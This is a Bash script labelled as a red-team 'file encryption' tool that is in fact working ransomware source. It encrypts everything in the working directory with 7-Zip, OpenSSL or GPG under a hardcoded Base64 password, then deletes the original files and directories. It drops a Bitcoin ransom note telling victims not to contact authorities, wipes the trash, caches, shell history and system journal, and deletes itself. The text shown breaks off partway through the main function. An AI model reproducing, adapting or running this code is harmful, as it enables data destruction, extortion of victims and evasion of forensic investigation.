#!/bin/bash
################################################################################
# File Encryption Script (Bash/Linux)
# For AUTHORIZED Red Team Operations Only
# WARNING: This will encrypt and delete files - use only in test environments
################################################################################

set -o errexit  # Exit on error (disabled for controlled error handling)
set +e          # Allow errors to be handled manually

# Configuration
REMOTE_SERVER="http://YOUR_SERVER_IP_HERE"
SEVEN_ZIP_URL="$REMOTE_SERVER/p7zip-full.tar.gz"
ARCHIVE_NAME=""  # Will be set based on encryption method used
ARCHIVE_NAME_7Z="encrypted_files.7z"
ARCHIVE_NAME_OPENSSL="encrypted_files.tar.gz.enc"
ARCHIVE_NAME_GPG="encrypted_files.tar.gz.gpg"
INSTALL_DIR="/usr/local/bin"
TEMP_DIR="/tmp/7z_temp_$$"
ENCRYPTION_METHOD=""  # Will be set to: 7z, openssl, or gpg

# Enable debug mode: export DEBUG=1 before running script
DEBUG="${DEBUG:-1}"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

################################################################################
# Logging Functions
################################################################################

log_debug() {
    if [ "$DEBUG" = "1" ]; then
        echo -e "${CYAN}[DEBUG]${NC} $*" >&2
    fi
}

log_info() {
    echo -e "${CYAN}[*]${NC} $*" >&2
}

log_success() {
    echo -e "${GREEN}[+]${NC} $*" >&2
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $*" >&2
}

log_error() {
    echo -e "${RED}[-]${NC} $*" >&2
}

################################################################################
# Password Configuration - Multiple Methods (Priority Order)
################################################################################

get_password() {
    local password=""
    local method=""

    log_debug "Starting password configuration..."

    # Method 1: Check for environment variable (highest priority)
    # Usage: export ENCRYPT_KEY=yourpassword && ./encrypt_files.sh
    if [ -n "$ENCRYPT_KEY" ]; then
        password="$ENCRYPT_KEY"
        method="Environment Variable"
        log_debug "Password set from environment variable"
    # Method 2: Decode from Base64-encoded string (obfuscated storage)
    # This is "antai" encoded in Base64: YW50YWk=
    # To encode your own: echo -n "yourpassword" | base64
    elif [ -z "$password" ]; then
        log_debug "Attempting Base64 password decode..."
        ENCODED_PASSWORD="YW50YWk="
        password=$(echo "$ENCODED_PASSWORD" | base64 -d 2>/dev/null || echo "")
        if [ -n "$password" ]; then
            method="Base64 Decoded"
            log_debug "Password decoded from Base64"
        fi
    fi

    # Method 3: Generate random password (use if above methods fail)
    if [ -z "$password" ]; then
        log_debug "Generating random password..."
        # Generate 16-character random password with mixed case, numbers, and symbols
        password=$(tr -dc 'A-Za-z0-9!#$%&*+=-' < /dev/urandom | head -c 16)
        method="Random Generated"
    fi

    # Fallback if all methods fail
    if [ -z "$password" ]; then
        log_debug "All password methods failed, using fallback"
        password="Fallback_P@ssw0rd_$$_$RANDOM"
        method="Fallback Random"
    fi

    log_debug "Password configured using: $method"

    echo "$password"
    PASSWORD_METHOD="$method"
}

################################################################################
# Banner
################################################################################

print_banner() {
    echo ""
    echo "============================================================================"
    echo "File Encryption - Red Team Operation"
    echo "============================================================================"
    echo ""
    echo -e "${RED}[WARNING]${NC} This script will encrypt and delete files in current directory"
    echo -e "${RED}[WARNING]${NC} For authorized testing only - ensure proper authorization"
    echo ""
    echo "Current Directory: $(pwd)"
    echo "Password Method: $PASSWORD_METHOD"
    echo "Encryption Priority: 7-Zip > OpenSSL > GPG"
    echo ""
    echo "Starting in 5 seconds..."
    sleep 5
    echo ""
}

################################################################################
# 7-Zip Detection and Installation
################################################################################

test_7zip() {
    local exe="$1"

    if [ ! -f "$exe" ] && ! command -v "$exe" &> /dev/null; then
        return 1
    fi

    # Test if it actually works
    if "$exe" --help &> /dev/null || "$exe" -h &> /dev/null; then
        return 0
    fi

    return 1
}

find_7zip() {
    log_info "Phase 1: Checking for existing 7z installation..."

    # Get script directory
    SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"

    # Priority 1: Script directory
    if [ -f "$SCRIPT_DIR/7z" ]; then
        log_debug "Checking: $SCRIPT_DIR/7z"
        if test_7zip "$SCRIPT_DIR/7z"; then
            log_success "Found working 7z in script directory"
            echo "$SCRIPT_DIR/7z"
            return 0
        fi
    fi

    if [ -f "$SCRIPT_DIR/7za" ]; then
        log_debug "Checking: $SCRIPT_DIR/7za"
        if test_7zip "$SCRIPT_DIR/7za"; then
            log_success "Found working 7za in script directory"
            echo "$SCRIPT_DIR/7za"
            return 0
        fi
    fi

    # Priority 2: Current directory
    if [ -f "./7z" ]; then
        log_debug "Checking: ./7z"
        if test_7zip "./7z"; then
            log_success "Found working 7z in current directory"
            echo "./7z"
            return 0
        fi
    fi

    if [ -f "./7za" ]; then
        log_debug "Checking: ./7za"
        if test_7zip "./7za"; then
            log_success "Found working 7za in current directory"
            echo "./7za"
            return 0
        fi
    fi

    # Priority 3: System PATH
    log_debug "Checking system PATH for 7z/7za"
    if command -v 7z &> /dev/null; then
        if test_7zip "7z"; then
            log_success "Found working 7z in system PATH"
            echo "7z"
            return 0
        fi
    fi

    if command -v 7za &> /dev/null; then
        if test_7zip "7za"; then
            log_success "Found working 7za in system PATH"
            echo "7za"
            return 0
        fi
    fi

    # Priority 4: Common installation paths
    local common_paths=(
        "/usr/bin/7z"
        "/usr/bin/7za"
        "/usr/local/bin/7z"
        "/usr/local/bin/7za"
        "/opt/7-zip/7z"
        "/opt/p7zip/7z"
    )

    for path in "${common_paths[@]}"; do
        log_debug "Checking: $path"
        if [ -f "$path" ] && test_7zip "$path"; then
            log_success "Found working 7z at: $path"
            echo "$path"
            return 0
        fi
    done

    log_warning "No working 7z found in existing locations"
    return 1
}

install_7zip() {
    log_info "Phase 2: Attempting to install 7-Zip..."

    # Detect package manager and install
    if command -v apt-get &> /dev/null; then
        log_info "Detected apt package manager (Debian/Ubuntu)"
        log_info "Installing p7zip-full..."

        if sudo apt-get update -qq && sudo apt-get install -y p7zip-full; then
            log_success "Installed p7zip-full via apt"
            if command -v 7z &> /dev/null; then
                echo "7z"
                return 0
            fi
        else
            log_warning "apt installation failed or requires sudo"
        fi
    elif command -v yum &> /dev/null; then
        log_info "Detected yum package manager (RHEL/CentOS)"
        log_info "Installing p7zip..."

        if sudo yum install -y p7zip p7zip-plugins; then
            log_success "Installed p7zip via yum"
            if command -v 7za &> /dev/null; then
                echo "7za"
                return 0
            fi
        else
            log_warning "yum installation failed or requires sudo"
        fi
    elif command -v dnf &> /dev/null; then
        log_info "Detected dnf package manager (Fedora)"
        log_info "Installing p7zip..."

        if sudo dnf install -y p7zip p7zip-plugins; then
            log_success "Installed p7zip via dnf"
            if command -v 7za &> /dev/null; then
                echo "7za"
                return 0
            fi
        else
            log_warning "dnf installation failed or requires sudo"
        fi
    elif command -v pacman &> /dev/null; then
        log_info "Detected pacman package manager (Arch)"
        log_info "Installing p7zip..."

        if sudo pacman -S --noconfirm p7zip; then
            log_success "Installed p7zip via pacman"
            if command -v 7z &> /dev/null; then
                echo "7z"
                return 0
            fi
        else
            log_warning "pacman installation failed or requires sudo"
        fi
    elif command -v zypper &> /dev/null; then
        log_info "Detected zypper package manager (openSUSE)"
        log_info "Installing p7zip..."

        if sudo zypper install -y p7zip; then
            log_success "Installed p7zip via zypper"
            if command -v 7z &> /dev/null; then
                echo "7z"
                return 0
            fi
        else
            log_warning "zypper installation failed or requires sudo"
        fi
    elif command -v brew &> /dev/null; then
        log_info "Detected Homebrew package manager (macOS)"
        log_info "Installing p7zip..."

        if brew install p7zip; then
            log_success "Installed p7zip via brew"
            if command -v 7z &> /dev/null; then
                echo "7z"
                return 0
            fi
        else
            log_warning "brew installation failed"
        fi
    else
        log_warning "No supported package manager found"
    fi

    return 1
}

download_7zip() {
    log_info "Phase 3: Attempting to download 7-Zip standalone..."

    # Create temp directory
    mkdir -p "$TEMP_DIR"

    # Download portable 7za for Linux
    local download_url="https://www.7-zip.org/a/7z2301-linux-x64.tar.xz"
    local dest_file="$TEMP_DIR/7z-linux.tar.xz"

    log_info "Downloading from: $download_url"

    if command -v wget &> /dev/null; then
        log_debug "Using wget for download"
        if wget -q --timeout=60 -O "$dest_file" "$download_url" 2>/dev/null; then
            log_success "Downloaded successfully with wget"

            # Extract
            log_info "Extracting 7-Zip..."
            if tar -xf "$dest_file" -C "$TEMP_DIR" 2>/dev/null; then
                # Find the 7zz or 7z binary
                if [ -f "$TEMP_DIR/7zz" ]; then
                    chmod +x "$TEMP_DIR/7zz"
                    log_success "Extracted 7zz successfully"
                    echo "$TEMP_DIR/7zz"
                    return 0
                elif [ -f "$TEMP_DIR/7z" ]; then
                    chmod +x "$TEMP_DIR/7z"
                    log_success "Extracted 7z successfully"
                    echo "$TEMP_DIR/7z"
                    return 0
                fi
            fi
        fi
    elif command -v curl &> /dev/null; then
        log_debug "Using curl for download"
        if curl -sL --max-time 60 -o "$dest_file" "$download_url" 2>/dev/null; then
            log_success "Downloaded successfully with curl"

            # Extract
            log_info "Extracting 7-Zip..."
            if tar -xf "$dest_file" -C "$TEMP_DIR" 2>/dev/null; then
                if [ -f "$TEMP_DIR/7zz" ]; then
                    chmod +x "$TEMP_DIR/7zz"
                    log_success "Extracted 7zz successfully"
                    echo "$TEMP_DIR/7zz"
                    return 0
                elif [ -f "$TEMP_DIR/7z" ]; then
                    chmod +x "$TEMP_DIR/7z"
                    log_success "Extracted 7z successfully"
                    echo "$TEMP_DIR/7z"
                    return 0
                fi
            fi
        fi
    else
        log_warning "Neither wget nor curl available for download"
    fi

    return 1
}

acquire_7zip() {
    log_info "Step 1/6: Locating or acquiring 7-Zip executable..."

    # Try to find existing installation
    local seven_zip
    seven_zip=$(find_7zip)
    if [ $? -eq 0 ] && [ -n "$seven_zip" ]; then
        echo "$seven_zip"
        return 0
    fi

    # Try to install from package manager
    seven_zip=$(install_7zip)
    if [ $? -eq 0 ] && [ -n "$seven_zip" ]; then
        echo "$seven_zip"
        return 0
    fi

    # Try to download standalone
    seven_zip=$(download_7zip)
    if [ $? -eq 0 ] && [ -n "$seven_zip" ]; then
        echo "$seven_zip"
        return 0
    fi

    # All methods failed
    log_error "CRITICAL ERROR: Could not locate or obtain 7-Zip"
    log_error "Attempted all available methods:"
    log_error "  Phase 1: Checked existing installations"
    log_error "  Phase 2: Tried package manager installation"
    log_error "  Phase 3: Attempted download from 7-zip.org"
    log_error ""
    log_error "Solutions:"
    log_error "  1. Install manually: apt-get install p7zip-full (Debian/Ubuntu)"
    log_error "  2. Install manually: yum install p7zip (RHEL/CentOS)"
    log_error "  3. Download and place 7z binary in current directory"
    log_error "  4. Ensure internet connectivity for auto-download"
    log_error "  5. Run with DEBUG=1 for more details"

    return 1
}

################################################################################
# Archive Operations
################################################################################

create_encrypted_archive() {
    local seven_zip="$1"
    local password="$2"

    log_info "Step 2/6: Creating encrypted 7z archive..."
    log_info "Password: $password"
    log_info "This may take a while depending on file size..."
    echo ""

    log_debug "7-Zip executable: $seven_zip"
    log_debug "Archive path: $(pwd)/$ARCHIVE_NAME_7Z"
    log_debug "Source directory: $(pwd)"
    log_debug "Password method: $PASSWORD_METHOD"

    if [ "$DEBUG" = "1" ]; then
        log_debug "Testing 7-Zip executable..."
        "$seven_zip" --help || "$seven_zip" -h
        log_debug "7-Zip test exit code: $?"

        log_debug "Checking disk space..."
        df -h "$(pwd)"

        log_debug "Current directory contents:"
        ls -lah
    fi

    # Create archive with maximum compression and encryption
    # Parameters: -t7z (archive type), -m0=lzma2 (compression method), -mx=9 (ultra compression)
    #             -mfb=64 (fast bytes), -md=32m (32MB dictionary), -ms=on (solid), -mhe=on (encrypt headers)

    local archive_path="$(pwd)/$ARCHIVE_NAME_7Z"

    if [ "$DEBUG" = "1" ]; then
        log_debug "Running 7-Zip with full output..."
        "$seven_zip" a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on -p"$password" "$archive_path" ./* -r
    else
        "$seven_zip" a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on -p"$password" "$archive_path" ./* -r >/dev/null 2>&1
    fi

    local exit_code=$?
    log_debug "7-Zip archive creation exit code: $exit_code"

    # 7-Zip exit codes: 0=success, 1=warning(non-fatal), 2=fatal error, 7=command line error, 8=not enough memory
    if [ $exit_code -gt 1 ]; then
        echo ""
        log_error "Failed to create archive - Error Level: $exit_code"
        log_error "Possible causes:"
        if [ $exit_code -eq 2 ]; then
            log_error "  - Error code 2: Fatal error (no files matched or permission denied)"
        elif [ $exit_code -eq 7 ]; then
            log_error "  - Error code 7: Command line error"
        elif [ $exit_code -eq 8 ]; then
            log_error "  - Error code 8: Not enough memory"
        fi
        log_error "Operation aborted - no files will be deleted"
        return 1
    fi

    # Exit code 0 or 1 is acceptable
    echo ""
    log_success "Archive creation successful (exit code: $exit_code)"
    if [ $exit_code -eq 1 ]; then
        log_warning "Archive created with warnings (non-fatal)"
    fi

    # Verify archive was created
    if [ ! -f "$archive_path" ]; then
        log_error "Archive file was not created"
        log_error "Expected location: $archive_path"
        log_error "Operation aborted - no files will be deleted"
        return 1
    fi

    local archive_size
    archive_size=$(stat -f%z "$archive_path" 2>/dev/null || stat -c%s "$archive_path" 2>/dev/null)
    log_debug "Archive file size: $archive_size bytes"

    if [ -z "$archive_size" ] || [ "$archive_size" -eq 0 ]; then
        log_error "Archive file is 0 bytes!"
        log_error "Operation aborted - no files will be deleted"
        return 1
    fi

    log_success "Archive created successfully: $ARCHIVE_NAME_7Z"
    log_info "Archive size: $archive_size bytes"

    return 0
}

verify_archive() {
    local seven_zip="$1"
    local password="$2"

    log_info "Step 3/6: Verifying archive integrity..."

    local archive_path="$(pwd)/$ARCHIVE_NAME_7Z"

    if [ ! -f "$archive_path" ]; then
        log_error "CRITICAL: Archive file not found!"
        log_error "Expected location: $archive_path"
        log_error "Aborting deletion phase for safety"
        return 1
    fi

    # Check archive size
    local archive_size
    archive_size=$(stat -f%z "$archive_path" 2>/dev/null || stat -c%s "$archive_path" 2>/dev/null)

    if [ -z "$archive_size" ] || [ "$archive_size" -eq 0 ]; then
        log_error "CRITICAL: Archive file is 0 bytes!"
        log_error "Aborting deletion phase for safety"
        return 1
    fi

    log_info "Archive size: $archive_size bytes"
    log_info "Testing archive integrity with password..."

    if [ "$DEBUG" = "1" ]; then
        log_debug "Running: $seven_zip t -p[PASSWORD] $archive_path"
        "$seven_zip" t -p"$password" "$archive_path"
    else
        "$seven_zip" t -p"$password" "$archive_path" >/dev/null 2>&1
    fi

    local verify_code=$?
    log_debug "Archive test exit code: $verify_code"

    if [ $verify_code -ne 0 ]; then
        log_error "CRITICAL: Archive verification failed!"
        log_error "Exit code: $verify_code"
        log_error "The archive may be corrupted or password incorrect"
        log_error "Aborting deletion phase for safety"
        echo ""
        log_info "Attempting to get more details..."
        "$seven_zip" t -p"$password" "$archive_path"
        return 1
    fi

    log_success "Archive verified successfully - integrity confirmed"
    return 0
}

################################################################################
# Alternative Encryption Methods (Fallbacks)
################################################################################

create_openssl_archive() {
    local password="$1"

    log_info "Attempting tar + OpenSSL encryption method..."
    log_info "This method uses AES-256 encryption"
    echo ""

    local archive_path="$(pwd)/$ARCHIVE_NAME_OPENSSL"

    log_debug "Archive path: $archive_path"
    log_debug "Encryption: AES-256-CBC"

    # Check if openssl is available
    if ! command -v openssl &> /dev/null; then
        log_warning "OpenSSL not found"
        return 1
    fi

    if ! command -v tar &> /dev/null; then
        log_warning "tar not found"
        return 1
    fi

    log_info "Creating compressed tar archive with OpenSSL encryption..."

    # Create list of files to archive (excluding protected files)
    local temp_list="$TEMP_DIR/file_list_$$"
    mkdir -p "$TEMP_DIR"

    find . -type f -print0 2>/dev/null | while IFS= read -r -d '' file; do
        local basename
        basename=$(basename "$file")
        # Skip protected files
        if [[ "$basename" != *.7z ]] && \
           [[ "$basename" != "encrypt_files.sh" ]] && \
           [[ "$basename" != "encrypt_files.bat" ]] && \
           [[ "$basename" != "encrypt_files.ps1" ]] && \
           [[ "$basename" != "README_IMPORTANT.txt" ]] && \
           [[ "$basename" != "7z"* ]] && \
           [[ "$basename" != *.enc ]] && \
           [[ "$basename" != *.gpg ]]; then
            echo "$file"
        fi
    done > "$temp_list"

    if [ ! -s "$temp_list" ]; then
        log_warning "No files found to archive"
        rm -f "$temp_list"
        return 1
    fi

    # Create encrypted archive: tar + gzip + openssl
    if [ "$DEBUG" = "1" ]; then
        tar -czf - -T "$temp_list" 2>&1 | openssl enc -e -aes-256-cbc -salt -pbkdf2 -pass pass:"$password" -out "$archive_path"
    else
        tar -czf - -T "$temp_list" 2>/dev/null | openssl enc -e -aes-256-cbc -salt -pbkdf2 -pass pass:"$password" -out "$archive_path" 2>/dev/null
    fi

    local exit_code=$?
    rm -f "$temp_list"

    if [ $exit_code -ne 0 ]; then
        log_error "Failed to create OpenSSL archive - Error code: $exit_code"
        return 1
    fi

    # Verify archive was created
    if [ ! -f "$archive_path" ]; then
        log_error "Archive file was not created"
        return 1
    fi

    local archive_size
    archive_size=$(stat -f%z "$archive_path" 2>/dev/null || stat -c%s "$archive_path" 2>/dev/null)

    if [ -z "$archive_size" ] || [ "$archive_size" -eq 0 ]; then
        log_error "Archive file is 0 bytes!"
        return 1
    fi

    log_success "OpenSSL archive created successfully: $ARCHIVE_NAME_OPENSSL"
    log_info "Archive size: $archive_size bytes"
    log_info "Encryption: AES-256-CBC with PBKDF2"

    ARCHIVE_NAME="$ARCHIVE_NAME_OPENSSL"
    ENCRYPTION_METHOD="openssl"

    return 0
}

verify_openssl_archive() {
    local password="$1"

    log_info "Verifying OpenSSL archive integrity..."

    local archive_path="$(pwd)/$ARCHIVE_NAME_OPENSSL"

    if [ ! -f "$archive_path" ]; then
        log_error "CRITICAL: Archive file not found!"
        return 1
    fi

    # Test decryption without extracting
    if [ "$DEBUG" = "1" ]; then
        log_debug "Testing OpenSSL decryption..."
        openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:"$password" -in "$archive_path" 2>&1 | tar -tzf - >/dev/null 2>&1
    else
        openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:"$password" -in "$archive_path" 2>/dev/null | tar -tzf - >/dev/null 2>&1
    fi

    local verify_code=$?

    if [ $verify_code -ne 0 ]; then
        log_error "CRITICAL: Archive verification failed!"
        log_error "The archive may be corrupted or password incorrect"
        return 1
    fi

    log_success "OpenSSL archive verified successfully"
    return 0
}

create_gpg_archive() {
    local password="$1"

    log_info "Attempting tar + GPG encryption method..."
    log_info "This method uses symmetric AES-256 encryption"
    echo ""

    local archive_path="$(pwd)/$ARCHIVE_NAME_GPG"

    log_debug "Archive path: $archive_path"
    log_debug "Encryption: GPG symmetric with AES-256"

    # Check if gpg is available
    if ! command -v gpg &> /dev/null; then
        log_warning "GPG not found"
        return 1
    fi

    if ! command -v tar &> /dev/null; then
        log_warning "tar not found"
        return 1
    fi

    log_info "Creating compressed tar archive with GPG encryption..."

    # Create list of files to archive
    local temp_list="$TEMP_DIR/file_list_$$"
    mkdir -p "$TEMP_DIR"

    find . -type f -print0 2>/dev/null | while IFS= read -r -d '' file; do
        local basename
        basename=$(basename "$file")
        # Skip protected files
        if [[ "$basename" != *.7z ]] && \
           [[ "$basename" != "encrypt_files.sh" ]] && \
           [[ "$basename" != "encrypt_files.bat" ]] && \
           [[ "$basename" != "encrypt_files.ps1" ]] && \
           [[ "$basename" != "README_IMPORTANT.txt" ]] && \
           [[ "$basename" != "7z"* ]] && \
           [[ "$basename" != *.enc ]] && \
           [[ "$basename" != *.gpg ]]; then
            echo "$file"
        fi
    done > "$temp_list"

    if [ ! -s "$temp_list" ]; then
        log_warning "No files found to archive"
        rm -f "$temp_list"
        return 1
    fi

    # Create encrypted archive: tar + gzip + gpg
    if [ "$DEBUG" = "1" ]; then
        tar -czf - -T "$temp_list" 2>&1 | gpg --batch --yes --passphrase "$password" --symmetric --cipher-algo AES256 -o "$archive_path"
    else
        tar -czf - -T "$temp_list" 2>/dev/null | gpg --batch --yes --passphrase "$password" --symmetric --cipher-algo AES256 -o "$archive_path" 2>/dev/null
    fi

    local exit_code=$?
    rm -f "$temp_list"

    if [ $exit_code -ne 0 ]; then
        log_error "Failed to create GPG archive - Error code: $exit_code"
        return 1
    fi

    # Verify archive was created
    if [ ! -f "$archive_path" ]; then
        log_error "Archive file was not created"
        return 1
    fi

    local archive_size
    archive_size=$(stat -f%z "$archive_path" 2>/dev/null || stat -c%s "$archive_path" 2>/dev/null)

    if [ -z "$archive_size" ] || [ "$archive_size" -eq 0 ]; then
        log_error "Archive file is 0 bytes!"
        return 1
    fi

    log_success "GPG archive created successfully: $ARCHIVE_NAME_GPG"
    log_info "Archive size: $archive_size bytes"
    log_info "Encryption: GPG symmetric AES-256"

    ARCHIVE_NAME="$ARCHIVE_NAME_GPG"
    ENCRYPTION_METHOD="gpg"

    return 0
}

verify_gpg_archive() {
    local password="$1"

    log_info "Verifying GPG archive integrity..."

    local archive_path="$(pwd)/$ARCHIVE_NAME_GPG"

    if [ ! -f "$archive_path" ]; then
        log_error "CRITICAL: Archive file not found!"
        return 1
    fi

    # Test decryption without extracting
    if [ "$DEBUG" = "1" ]; then
        log_debug "Testing GPG decryption..."
        gpg --batch --yes --passphrase "$password" -d "$archive_path" 2>&1 | tar -tzf - >/dev/null 2>&1
    else
        gpg --batch --yes --passphrase "$password" -d "$archive_path" 2>/dev/null | tar -tzf - >/dev/null 2>&1
    fi

    local verify_code=$?

    if [ $verify_code -ne 0 ]; then
        log_error "CRITICAL: Archive verification failed!"
        log_error "The archive may be corrupted or password incorrect"
        return 1
    fi

    log_success "GPG archive verified successfully"
    return 0
}

################################################################################
# File Deletion
################################################################################

should_delete_file() {
    local file="$1"
    local basename
    basename=$(basename "$file")

    # Skip the archive (whatever method was used)
    [[ "$basename" == "$ARCHIVE_NAME" ]] && return 1
    [[ "$basename" == "$ARCHIVE_NAME_7Z" ]] && return 1
    [[ "$basename" == "$ARCHIVE_NAME_OPENSSL" ]] && return 1
    [[ "$basename" == "$ARCHIVE_NAME_GPG" ]] && return 1

    # Skip any encrypted archive files
    [[ "$basename" == *.7z ]] && return 1
    [[ "$basename" == *.enc ]] && return 1
    [[ "$basename" == *.gpg ]] && return 1

    # Skip this script
    [[ "$basename" == "encrypt_files.sh" ]] && return 1
    [[ "$basename" == "encrypt_files.bat" ]] && return 1
    [[ "$basename" == "encrypt_files.ps1" ]] && return 1

    # Skip ransom note
    [[ "$basename" == "README_IMPORTANT.txt" ]] && return 1

    # Skip 7z executables
    [[ "$basename" == "7z" ]] && return 1
    [[ "$basename" == "7za" ]] && return 1
    [[ "$basename" == "7zz" ]] && return 1
    [[ "$basename" == 7z*.tar.* ]] && return 1

    # Delete everything else
    return 0
}

should_delete_directory() {
    local dir="$1"
    local basename
    basename=$(basename "$dir")

    # Skip current directory
    [[ "$dir" == "." ]] && return 1
    [[ "$dir" == "./" ]] && return 1

    # Skip temp directory used by script
    [[ "$dir" == "$TEMP_DIR"* ]] && return 1

    # Delete everything else
    return 0
}

delete_original_files() {
    log_info "Step 4/6: Deleting original files..."
    log_warning "This will permanently delete files!"
    log_warning "Press Ctrl+C to abort in the next 5 seconds..."
    sleep 5
    echo ""

    local file_count=0
    local deleted_count=0
    local failed_count=0
    local dir_count=0
    local dir_deleted=0

    log_info "Scanning for files to delete..."

    # Phase 1: Delete all files recursively with force
    while IFS= read -r -d '' file; do
        if should_delete_file "$file"; then
            ((file_count++))

            if [ "$DEBUG" = "1" ]; then
                log_info "Deleting file: $file"
            fi

            # Use -f to force, ignore errors for read-only files
            if rm -f "$file" 2>/dev/null; then
                ((deleted_count++))
            else
                # Try with more force - change permissions first
                if chmod 777 "$file" 2>/dev/null && rm -f "$file" 2>/dev/null; then
                    ((deleted_count++))
                else
                    ((failed_count++))
                    log_warning "Failed to delete: $file"
                fi
            fi
        fi
    done < <(find . -type f -print0 2>/dev/null)

    echo ""
    log_info "File Deletion Summary:"
    log_info "  Files processed: $file_count"
    log_info "  Successfully deleted: $deleted_count"

    if [ $failed_count -gt 0 ]; then
        log_warning "  Failed to delete: $failed_count"
    else
        log_info "  Failed to delete: $failed_count"
    fi

    echo ""
    log_info "Scanning for directories to delete..."

    # Phase 2: Delete directories (from deepest to shallowest)
    # Sort in reverse to delete child directories before parent directories
    while IFS= read -r -d '' dir; do
        if should_delete_directory "$dir"; then
            ((dir_count++))

            if [ "$DEBUG" = "1" ]; then
                log_info "Deleting directory: $dir"
            fi

            # Try to delete directory (will work if empty)
            if rmdir "$dir" 2>/dev/null; then
                ((dir_deleted++))
            else
                # Directory not empty, try force deletion
                if rm -rf "$dir" 2>/dev/null; then
                    ((dir_deleted++))
                else
                    # Try changing permissions first
                    if chmod -R 777 "$dir" 2>/dev/null && rm -rf "$dir" 2>/dev/null; then
                        ((dir_deleted++))
                    else
                        if [ "$DEBUG" = "1" ]; then
                            log_warning "Failed to delete directory: $dir"
                        fi
                    fi
                fi
            fi
        fi
    done < <(find . -type d -depth -print0 2>/dev/null)

    echo ""
    log_info "Directory Deletion Summary:"
    log_info "  Directories processed: $dir_count"
    log_info "  Successfully deleted: $dir_deleted"

    # Phase 3: Final cleanup - remove any remaining empty directories
    log_info "Final cleanup of empty directories..."
    find . -type d -empty -delete 2>/dev/null || true

    echo ""
    log_success "File and directory deletion completed"
}

################################################################################
# Ransom Note
################################################################################

create_ransom_note() {
    log_info "Step 5/6: Creating ransom note..."

    cat > README_IMPORTANT.txt << 'EOF'
============================================================================
YOUR FILES HAVE BEEN ENCRYPTED
============================================================================

All your files have been encrypted with military-grade encryption.
To decrypt your files, you must pay the ransom.

Contact: darkweb@onion.com
Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, you will receive the decryption key.
DO NOT attempt to decrypt files yourself or contact authorities.
This will result in permanent data loss.

You have 48 hours to comply.
============================================================================
EOF

    log_success "Ransom note created: README_IMPORTANT.txt"
}

################################################################################
# System Cleanup
################################################################################

cleanup_system() {
    log_info "Step 6/6: Running system cleanup..."
    log_info "Starting background cleanup processes..."

    # Clear trash/recycle bin
    log_info "Emptying trash..."
    if [ -d "$HOME/.local/share/Trash" ]; then
        rm -rf "$HOME/.local/share/Trash"/* 2>/dev/null || true
        log_success "Trash emptied"
    fi

    # Clear user temp files
    log_info "Clearing temp files..."
    if [ -d "/tmp" ]; then
        find /tmp -type f -user "$(whoami)" -delete 2>/dev/null || true
    fi
    if [ -d "$HOME/.cache" ]; then
        rm -rf "$HOME/.cache"/* 2>/dev/null || true
    fi

    # Clear recent documents
    log_info "Clearing recent documents..."
    if [ -f "$HOME/.recently-used" ]; then
        rm -f "$HOME/.recently-used" 2>/dev/null || true
    fi
    if [ -d "$HOME/.local/share/recently-used.xbel" ]; then
        rm -f "$HOME/.local/share/recently-used.xbel" 2>/dev/null || true
    fi

    # Clear bash history
    log_info "Clearing shell history..."
    history -c 2>/dev/null || true
    if [ -f "$HOME/.bash_history" ]; then
        > "$HOME/.bash_history"
    fi
    if [ -f "$HOME/.zsh_history" ]; then
        > "$HOME/.zsh_history"
    fi

    # Clear thumbnails
    log_info "Clearing thumbnail cache..."
    if [ -d "$HOME/.thumbnails" ]; then
        rm -rf "$HOME/.thumbnails"/* 2>/dev/null || true
    fi
    if [ -d "$HOME/.cache/thumbnails" ]; then
        rm -rf "$HOME/.cache/thumbnails"/* 2>/dev/null || true
    fi

    # Clear systemd journal logs (if running as root)
    if [ "$EUID" -eq 0 ]; then
        log_info "Clearing system logs..."
        journalctl --vacuum-time=1s 2>/dev/null || true
    fi

    log_success "Cleanup completed"
}

################################################################################
# Self-Delete
################################################################################

self_delete() {
    log_info "Removing script traces..."

    local script_path
    script_path=$(readlink -f "${BASH_SOURCE[0]}" 2>/dev/null || echo "${BASH_SOURCE[0]}")
    local script_dir
    script_dir=$(dirname "$script_path")

    log_debug "Script path: $script_path"
    log_debug "Script directory: $script_dir"

    # Create a self-delete command that runs after the script exits
    (
        sleep 3
        rm -f "$script_path" 2>/dev/null
        rm -f "$script_dir"/encrypt_files.* 2>/dev/null
        rm -f "$script_dir"/7z*.tar.* 2>/dev/null
        rm -rf "$TEMP_DIR" 2>/dev/null
    ) &

    log_debug "Self-delete command launched"
}

################################################################################
# Main Execution
################################################################################

main() {
    # Get password
    PASSWORD=$(get_password)

    # Print banner
    print_banner

    local archive_created=false
    local archive_verified=false

    # Try encryption methods in priority order
    echo ""
    log_info "============================================================================"
    log_info "Attempting Encryption Methods (Priority Order)"
    log_info "============================================================================"
    echo ""

    # Method 1: Try 7-Zip
    log_info "Method 1: Attempting 7-Zip encryption..."
    echo ""
    SEVEN_ZIP=$(acquire_7zip)
    if [ $? -eq 0 ] && [ -n "$SEVEN_ZIP" ]; then
        log_success "Using 7-Zip executable: $SEVEN_ZIP"
        echo ""

        if create_encrypted_archive "$SEVEN_ZIP" "$PASSWORD"; then
            ARCHIVE_NAME="$ARCHIVE_NAME_7Z"
            ENCRYPTION_METHOD="7z"
            archive_created=true
            echo ""

            # Verify 7z archive
            if verify_archive "$SEVEN_ZIP" "$PASSWORD"; then
                archive_verified=true
            fi
        fi
    else
        log_warning "7-Zip not available, trying alternative methods..."
    fi

    # Method 2: Try tar + OpenSSL if 7z failed
    if [ "$archive_created" = false ]; then
        echo ""
        log_info "Method 2: Attempting tar + OpenSSL encryption..."
        echo ""

        if create_openssl_archive "$PASSWORD"; then
            archive_created=true
            echo ""

            # Verify OpenSSL archive
            if verify_openssl_archive "$PASSWORD"; then
                archive_verified=true
            fi
        else
            log_warning "OpenSSL encryption failed, trying GPG..."
        fi
    fi

    # Method 3: Try tar + GPG if OpenSSL failed
    if [ "$archive_created" = false ]; then
        echo ""
        log_info "Method 3: Attempting tar + GPG encryption..."
        echo ""

        if create_gpg_archive "$PASSWORD"; then
            archive_created=true
